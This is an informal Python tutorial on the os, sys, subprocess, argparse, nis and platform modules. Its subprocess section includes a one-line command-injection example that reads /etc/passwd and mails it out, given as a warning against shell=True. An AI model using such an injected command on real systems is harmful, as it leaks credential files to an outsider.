# Index:
* [os module](#os-module)
  * os.environ
  * os.environ\['PATH'\], os.pathsep
* [sys module](#sys-module)
  * sys.argv
  * sys.exit
  * misc stuff
* [subprocess module](#subprocess-module)
  * [shell or no shell](#shell-or-no-shell)
  * [sp.call](#sp-call)
  * [sp.check_call](#sp-check-call)
  * [sp.check_output](#sp-check-output)
  * [sp.Popen](#sp-popen)
    * Popen.poll, wait, communicate, terminate, kill, stdin, stdout, stderr, returncode
* [argparse module](#argparse-module)
* [nis module](#nis-module)
* [platform module](#platform-module)     
  
  
https://docs.python.org/2/library/filesys.html  
  
Sometimes, we need to modify environment variables and the PATH in order to get the needed/expected behavior of an exernal command/program that we need to run. For example, we might use subprocess to run a few lines of bash code to source something and run a tool; but we need to make sure the PATH is correct to give our tool the correct version of GCC, or for it to find any tools it needs to run.  We might need to set environmetn variables to trigger certain behavior in another program that we're calling.  This secion is all about doing that, and then how to call external tools/commands!
  
# os module
More os module things that weren't covered in teh files and paths content. What you see set will vary depending on your OS and more...

**os.environ**
Dictionary with all environment variables set when python process was launched. Modify them and any subprocesses will see the changes.
```python
In [6]: for key, val in os.environ.items():
   ...:     print key, ':', val
   ...:     
FVWM_USERDIR : /usr/users/home0/thedude
GROUP : users
REMOTEHOST : 10.121.208.53
MINICOM : -c on
SSH2_TTY : /dev/pts/195
CSHEDIT : emacs
HOSTTYPE : x86_64
...
In [7]: os.environ['MACHTYPE']
Out[7]: 'x86_64-suse-linux'
In [9]: os.environ['foo'] = 'bar'

In [10]: os.environ['foo']
Out[10]: 'bar'

In [30]: os.getenv('foo')
Out[30]: 'bar'

```
**Setting the env PATH**
The PATH variable defines where the system looks for executables when you run a command. In the example below, 'which' is a unix command that says what the path to a command is... it searches each directory in the PATH environment variable and returns the first one that has the command. This is the path that the command would be executed from given the current PATH value.
```python
In [17]: os.environ['PATH']
Out[17]: '/p/foobar/bin:/p/foobar/anaconda:/usr/users/home0/thedude/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/bin/X11:/usr/X11R6/bin:/usr/lib/mit/bin:/usr/lib/mit/sbin:/usr/lib/qt3/bin:/opt/kde3/bin:/usr/local/bin:/usr/common/script:.'

In [18]: import subprocess as sp

In [19]: sp.check_output(['which', 'python'])
Out[19]: '/p/foobar/anaconda/python\n'

In [20]: os.environ['PATH'] = os.pathsep.join(('/bin', '/usr/bin', '/sbin', '/usr/sbin'))

In [21]: sp.check_output(['which', 'python'])
Out[21]: '/usr/bin/python\n'
```
**os.pathsep** - separater used for the PATH varialbe on the system where python is running. 
```python
In [31]: os.pathsep
Out[31]: ':'
```
**os.getuid, setuid, getgid, setgid**
TBD
```python
foo
```

# sys module
Sys has a lot of low-level functionality with info about the running python interpreter, basic environmental stuff, and architecture specific stuff.  It's mostly out of our scope, but a couple of it's modules are important for general usage!  
  
**sys.argv** - list of arguments provided by the user when the python program was executed. 
The first item in this list is always the name of the running program. 
```
myhost:~> cat ~/bin/argtest.py
#!/usr/bin/env python
import sys
print sys.argv

myhost:~> ~/bin/argtest.py first "second stuff" third --fourth "six seven 8"
['/usr/users/home0/drnorris/bin/argtest.py', 'first', 'second stuff', 'third', '--fourth', 'six seven 8']
myhost:~> 
```

**sys.exit**
Call this to exit the program at any point. Give it an exit status to indicate whether or not errors were encountered when the program ran. Zero "0" exit status means success, and non-zero means there was a failure.  This is somewhat in contrast to truth-ness in programming where zero is usually False and non-zero evaluates to True.  
```
myhost:~> cat ~/bin/exittest.py 
#!/usr/bin/env python
import sys
if sys.argv[1] == 'success':
    sys.exit(0)
elif sys.argv[1] == 'failure':
    sys.exit(1)
myhost:~> if ~/bin/exittest.py success; then echo "got 0 exit status for success"; else echo "got non-zero exit status indicating failure"; fi
got 0 exit status for success

myhost:~> if ~/bin/exittest.py failure; then echo "got 0 exit status for success"; else echo "got non-zero exit status indicating failure"; fi
got non-zero exit status indicating failure

myhost:~> 
```
  
**sys.platform** - basic info about what type of system we're running on
```python
In [24]: sys.platform
Out[24]: 'linux2'
```
| System              | platform value |
|---------------------|----------------|
| Linux (2.x and 3.x) |	'linux2'       |
| Windows	            | 'win32'        |
| Windows/Cygwin	    |'cygwin'        |
| Mac OS X	          |'darwin'        |  
*and more...*  
  
**sys.getwindowsversion** - try this on windows...
  
**sys.maxint** - largest possible integer value on this system
```python
In [25]: sys.maxint
Out[25]: 9223372036854775807
```
**sys.floatinfo** - info about floating point representation on this system
```python
In [33]: sys.float_info
Out[33]: sys.float_info(max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min_exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)
```
**sys.getrecursionlimit** - how many function calls deep can your program go? 
```python
In [27]: sys.getrecursionlimit()
Out[27]: 1000
```
  
# subprocess module
This is a big one!  This has everything you need (probably) to make system calls from python and execute any random commands needed when your program runs.  
  
It's easy to abuse subprocess - don't use it for thigns that you should be using libraries for, like editing files, permissions, etc.  

Finally, subprocess can be a bit complex, depending on your needs, so it has a learning curve, but it's pretty friendly once you figure it out.  
  
https://docs.python.org/2/library/subprocess.html#replacing-older-functions-with-the-subprocess-module  
  
## shell or no shell?
**Command format without using the shell to execute the command**:
`['/som/path/my_command', '--arg1', 'val1', '--arg2', ...]`  
The command and each argument are separate strings in a list.  This is 100% the safest way to run anything with subprocess since it removes the possiblity that an unintended bit of code can get executed by the shell.  It makes it pretty simple to build commands, too... just keep appending args to the list until you have everything you need. 

**Command format with shell**:
`'''
source /blah/some_file.sh
/some/path/another_command --arg1 val1 --arg2 ...
'''`  
This is the one situation I can think of where it's important to be able to use `shell=True` when executing a command.  If I need to source some scripts to set up the environment for the command I'm going to run, then I don't see a good way around it (except maybe writing a wrapper to capture shell changes from the source and setting them before calling another command)...  
  
Anyway, try not to do that since, in situations where you external files or input can affect what you run, there is opporutnity to accidentally run stuff like this:
`/some/path/another_command --arg1 $(cat /etc/passwd | mail -s h4x0red_by joe@blow.com; echo actual_arg) --arg2 ...`  
And the shell will execute any of the nested commands, leaving you vulnerable.  
  
## sp.call
**Run a command and return the exit status**
* No exception raised if the exit status is not zero (non-zero exit status from a command means there was an error)
* FileNotFoundError exception raised if command does not exist. 
* This is blocking - python will stay at this command until it completes; then move on. 
```python
In [85]: sp.call(['/bin/true'])
Out[85]: 0  <- It returned the exit status!

In [86]: sp.call(['/bin/false'])
Out[86]: 1  <- non-zero exit status means error; false is error!

In [87]: sp.call(['/bin/doesnt-exist'])
'---------------------------------------------------------------------------
FileNotFoundError                         Traceback (most recent call last)
```
## sp.check_call
**Use this if you want an exception on non-zero exit status**
* Raises sp.CalledProcessErroron non-zero returncode
* Raises FileNotFoundError if command doesn't exist
* This is blocking
  
**Example with non-zero return code:**  
```python
In [101]: try:
     ...:     sp.check_call(['/bin/false'])
     ...: except sp.CalledProcessError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     print("Exit Status was:", e.returncode)
     ...: except FileNotFoundError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     
MESSAGE WAS: Command '['/bin/false']' returned non-zero exit status 1.
Exit Status was: 1
```
**Example with invalid command**  
```python
In [102]: try:
     ...:     sp.check_call(['/bin/some_foobar'])
     ...: except sp.CalledProcessError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     print("Exit Status was:", e.returncode)
     ...: except FileNotFoundError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     
MESSAGE WAS: [Errno 2] No such file or directory: '/bin/some_foobar'
```
**Exmaple where it works as expected
In [103]: try:
     ...:     sp.check_call(['/bin/true'])
     ...: except sp.CalledProcessError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     print("Exit Status was:", e.returncode)
     ...: except FileNotFoundError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     

In [104]: 

## sp.check_output
**Run a command and return it's output.**
* Raises sp.CalledProcessErroron non-zero returncode
* Raises FileNotFoundError if command doesn't exist
* This is blocking - python will stay at this command until it completes; then move on.  
```python
In [106]: try:
     ...:     output = sp.check_output(['ls', '-ld'])
     ...:     print("OUTPUT WAS:", output)
     ...: except sp.CalledProcessError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     print("Exit Status was:", e.returncode)
     ...: except FileNotFoundError as e:
     ...:     print("MESSAGE WAS:", e)
     ...:     
OUTPUT WAS: b'drwxrwxr-x 2 drnorris drnorris 4096 Oct 28 11:02 .\n'

In [107]: 
```

## sp.Popen
**This is the monster :)**
* NON-blocking, so you can run multiple commands in teh background concurrently if you want...
* Raises FileNotFoundError if command not found...
* Let's you redirect, capture, and chain-together stdin, stdout, stder from each process. 
We aren't giong to use this much here, but you should read about it!  
  
# argparse module
I'm kind of used to seeing people put argparse stuff at the top of their program in global namespace, but that's not really necessary; we can put it all into a function and call it at runtime to have the given argumetns processed.  
  
Argparse works on the same data available to use in `sys.argv`, so we can reference the given args ourselves before calling argparse, which can be useful if we wan to set global obtions like "DEBUG", at the top of our program, but still use argparse to handle all of the detailed arg stuff.  
  
You'll have to go through the documentation if you want to do anything fancy w/ argparse: https://docs.python.org/3/library/argparse.html  
  
Here's a simple example you can start with in your own code:
```python
.../EXAMPLES> cat args.py 
#!/usr/bin/env python
edude
import argparse
import sys

if '--debug' in sys.argv:
    print('We can check for specific args outside of argparse.\n')
    DEBUG=True

def getArgs():
    parser = argparse.ArgumentParser(
        prog=sys.argv[0],
        description="Test Program for Argparse\nThese sorts of things can be\nvery exciting.",
        epilog="And now, you know the rest of the story!")
    parser.add_argument('--verbose', '-v', help="verbose mode", action='count')
    parser.add_argument('--debug', help="debug mode", action='store_true')
    parser.add_argument('--widgets', type=int, help="number of widgets", action='store')

    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = getArgs()
    print("ARGS ARE:")
    print(args)
```
  
And a couple examples of it's output:  
```
.../EXAMPLES$ ./args.py --help
usage: ./args.py [-h] [--verbose] [--debug] [--widgets WIDGETS]

Test Program for Argparse These sorts of things can be very exciting.

optional arguments:
  -h, --help         show this help message and exit
  --verbose, -v      verbose mode
  --debug            debug mode
  --widgets WIDGETS  number of widgets

And now, you know the rest of the story!

../EXAMPLES> ./args.py --debug
We can check for specific args outside of argparse.

ARGS ARE:
Namespace(debug=True, verbose=None, widgets=None)

.../EXAMPLES> ./args.py -vv --widgets 42
ARGS ARE:
Namespace(debug=False, verbose=2, widgets=42)
drnorris@dadesktop:~/git/python_class/EXAMPLES$ 
```
  
# nis module
NIS is Network Information Service - sort of an extensin of the local system passwd, group, netgroup, etc files that are used for tracking users, groups, and other system information.  NIS is a distributed service for this content that's still used in industry today... The usage is pretty simple:
```python
In [36]: import nis

In [37]: nis.match('thedude', 'passwd')
Out[37]: 'thedude:passwordhash:1000:15:just.the.dude:/usr/users/home0/thedude:/bin/bash'

In [38]: nis.match('users', 'group')
Out[38]: 'users::15:thedude,andothers
```
  
# platform module
Sort of the python equivelant of the uname command.  Also has pointeres to some important libraries that python needs.  
```python
In [53]: import platform

In [54]: platform.uname()
Out[54]: 
('Linux',
 'fmyec0200',
 '3.0.101-107-default',
 '#1 SMP Thu Jun 22 14:37:55 UTC 2017 (414ea9f)',
 'x86_64',
 'x86_64')

In [55]: platform.processor()
Out[55]: 'x86_64'

In [56]: platform.platform()
Out[56]: 'Linux-3.0.101-107-default-x86_64-with-SuSE-11-x86_64'

In [57]: platform.machine()
Out[57]: 'x86_64'

In [58]: platform.system()
Out[58]: 'Linux'

In [59]: platform.release()
Out[59]: '3.0.101-107-default'
```
